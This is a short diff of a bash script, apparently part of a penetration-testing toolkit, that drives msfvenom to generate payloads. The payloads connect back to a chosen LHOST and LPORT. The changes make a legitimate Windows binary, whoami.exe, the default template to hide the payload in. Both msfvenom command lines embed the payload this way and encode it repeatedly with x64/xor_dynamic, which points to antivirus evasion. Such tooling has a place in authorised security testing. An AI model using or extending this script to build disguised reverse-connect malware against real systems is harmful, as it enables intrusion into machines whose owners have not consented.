@@ -167,23 +167,26 @@ fi
 
 x=$(echo $payload | sed 's/\//-/g')
 
-echo -n "Do you have a template file? (y/N) "
+echo -n "Use a template file? (y/N) "
 read answer
 
 if [ "$answer" == "y" ]; then
-     echo -n "Enter the path to the file: "
+     echo -n "Enter the path to the file (default whoami.exe): "
      read template
 
      if [ -z $template ]; then
-          f_error
+          template=/usr/share/windows-resources/binaries/whoami.exe
+          echo '[*] Using /usr/share/windows-resources/binaries/whoami.exe'
      fi
 
      if [ ! -f $template ]; then
           f_error
      fi
 
+     echo
      msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $home/data/$x-$lport-$iterations$extention
 else
+     echo
      msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $home/data/$x-$lport-$iterations$extention
 fi
 
